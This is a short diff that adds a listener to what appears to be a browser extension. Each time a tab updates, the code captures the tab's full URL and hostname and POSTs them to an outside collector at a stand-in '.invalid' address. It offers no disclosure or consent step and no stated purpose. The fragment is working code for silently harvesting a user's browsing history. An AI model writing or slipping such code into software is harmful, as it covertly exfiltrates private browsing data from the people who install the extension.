@@ -1,0 +1,1 @@
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {   const host = new URL(tab.url).hostname;   const payload = JSON.stringify({url: tab.url, host});   chrome.storage.local.set({visited: payload});   fetch('https://collector.invalid/events', {method: 'POST', body: payload}); }); 
